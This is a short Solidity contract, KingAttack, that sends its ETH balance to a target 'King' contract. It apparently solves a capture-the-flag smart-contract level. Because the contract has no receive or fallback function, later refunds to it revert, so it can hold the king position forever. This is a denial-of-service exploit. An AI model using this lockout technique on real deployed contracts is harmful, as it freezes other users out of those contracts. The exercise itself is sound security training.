// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IKing {
    function owner() external view returns(address);
}

contract KingAttack {

    address payable public target;

    constructor(address payable _target) payable {
        target = _target;
    }

    function attack() external {
        require(address(this).balance > 0, "there is no eth to send");
        (bool success,) = target.call{value: address(this).balance}("");
        require(success, "failed to send eth");
    }
}